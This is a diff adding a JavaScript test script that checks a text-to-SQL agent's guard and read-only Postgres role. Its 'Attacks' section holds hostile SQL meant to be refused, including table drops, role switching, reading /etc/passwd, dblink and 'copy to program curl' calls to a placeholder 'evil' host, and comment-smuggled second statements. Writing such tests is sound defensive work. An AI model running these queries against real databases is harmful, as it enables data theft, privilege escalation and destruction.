@@ -1,0 +1,92 @@
+// Security checks for the text-to-SQL agent's query path (guard + nlq_agent login).
+//
+//   npm run test:agent-guard
+//
+// Legitimate queries must run; every attack must be refused, by the guard and,
+// for the ones that reach it, by the database. Changes nothing.
+
+import { fileURLToPath } from "node:url";
+import pg from "pg";
+import { runSelect, closePool } from "../src/lib/agent/db.ts";
+
+process.loadEnvFile(fileURLToPath(new URL("../.env.local", import.meta.url)));
+
+let failures = 0;
+function report(pass, label, detail) {
+  if (!pass) failures++;
+  console.log(`${pass ? "PASS" : "FAIL"}  ${label}${detail ? `  ->  ${detail}` : ""}`);
+}
+
+async function allowed(label, role, sql, params) {
+  const r = await runSelect(sql, role, params);
+  report(r.ok, label, r.ok ? `${r.rowCount} rows${r.truncated ? " (truncated)" : ""}` : r.error);
+}
+
+async function refused(label, role, sql) {
+  const r = await runSelect(sql, role);
+  report(!r.ok, label, r.ok ? `RAN: ${JSON.stringify(r.rows.slice(0, 1))}` : r.error.slice(0, 110));
+}
+
+console.log("Legitimate queries");
+await allowed("student: cheapest listings", "nlq_student", "select title, sale_price from nlq.listings where sale_price is not null order by sale_price limit 5;");
+await allowed("student: unqualified view + calendar join", "nlq_student", "select c.semester, count(*) from listings l join calendar c on c.day = (l.listed_at at time zone 'America/New_York')::date group by 1");
+await allowed("admin: late rentals in spring move-out", "nlq_admin", "select count(*) from nlq.deals d join nlq.calendar c on c.day = d.rental_due_date where d.deal_type = 'rental' and d.returned_late and c.period = 'move-out' and c.academic_year = '2024-25'");
+await allowed("admin: CTE + window function", "nlq_admin", "with m as (select date_trunc('month', listed_on) as month, count(*) n from nlq.listings_all group by 1) select month, n, lag(n) over (order by month) from m order by month");
+await allowed("admin: extract / substring / position / trim / like escape", "nlq_admin", "select extract(year from listed_on), substring(title from 1 for 10), position('a' in title), trim(title) from nlq.listings_all where title like '%!%%' escape '!' limit 3");
+await allowed("admin: generate_series date spine", "nlq_admin", "select d::date, count(l.item_id) from generate_series('2025-01-01'::date, '2025-01-07', interval '1 day') d left join nlq.listings_all l on l.listed_on = d::date group by 1 order by 1");
+await allowed("admin: row cap (truncates at 200)", "nlq_admin", "select item_id from nlq.listings_all");
+await allowed("admin: trailing comment", "nlq_admin", "select count(*) from nlq.reviews -- total reviews");
+await allowed("student: parameter", "nlq_student", "select name from nlq.meetup_spots where name ilike $1", ["%curry%"]);
+
+console.log("\nAttacks");
+await refused("drop table", "nlq_admin", "drop table nlq.calendar");
+await refused("delete", "nlq_admin", "delete from nlq.calendar");
+await refused("two statements", "nlq_admin", "select 1; delete from nlq.calendar");
+await refused("set transaction read write", "nlq_admin", "set transaction read write");
+await refused("set role", "nlq_admin", "set role postgres");
+await refused("set_config role", "nlq_admin", "select set_config('role', 'postgres', true)");
+await refused("current_setting leak", "nlq_admin", "select current_setting('data_directory')");
+await refused("pg_sleep", "nlq_admin", "select pg_sleep(30)");
+await refused("pg_read_file", "nlq_admin", "select pg_read_file('/etc/passwd')");
+await refused("dblink", "nlq_admin", "select * from dblink('host=evil', 'select 1') as t(x int)");
+await refused("auth.users", "nlq_admin", "select email from auth.users");
+await refused("public.profiles (names)", "nlq_admin", "select name from public.profiles");
+await refused("catalog: pg_roles", "nlq_admin", "select * from pg_catalog.pg_roles");
+await refused("catalog unqualified: pg_user", "nlq_admin", "select * from pg_user");
+await refused("ops.agent_runs", "nlq_admin", "select * from ops.agent_runs");
+await refused("app write function", "nlq_admin", "select public.remove_listing(1)");
+await refused("app write function, unqualified", "nlq_admin", "select remove_listing(1)");
+await refused("data-modifying CTE", "nlq_admin", "with d as (delete from nlq.calendar returning *) select count(*) from d");
+await refused("select into (creates a table)", "nlq_admin", "select * into nlq.stolen from nlq.deals");
+await refused("for update (locks rows)", "nlq_admin", "select * from nlq.calendar for update");
+await refused("copy to program", "nlq_admin", "copy (select 1) to program 'curl evil'");
+await refused("explain analyze", "nlq_admin", "explain analyze select 1");
+await refused("student reads admin view", "nlq_student", "select count(*) from nlq.deals");
+await refused("student reads admin view in subquery", "nlq_student", "select (select count(*) from nlq.reviews)");
+await refused("set-returning function in FROM", "nlq_admin", "select * from pg_ls_dir('.') as t(x)");
+await refused("comment smuggling a second statement", "nlq_admin", "select 1 /* ; */ ; drop table nlq.calendar");
+
+console.log("\nDatabase layer alone (guard bypassed on purpose)");
+const db = new pg.Client({ connectionString: process.env.NLQ_DATABASE_URL, ssl: { rejectUnauthorized: false } });
+await db.connect();
+for (const [label, sql] of [
+  ["app write function inside the locked read-only transaction", "select public.remove_listing(1)"],
+  ["read-write switch after the lock query", "set transaction read write"],
+]) {
+  try {
+    await db.query("begin read only");
+    await db.query("set local role nlq_admin");
+    await db.query("select 1");
+    await db.query(sql);
+    report(false, label, "RAN");
+  } catch (e) {
+    report(true, label, e.message.slice(0, 110));
+  } finally {
+    await db.query("rollback").catch(() => {});
+  }
+}
+await db.end();
+await closePool();
+
+console.log(failures ? `\n${failures} check(s) FAILED` : "\nAll checks passed");
+process.exitCode = failures ? 1 : 0;
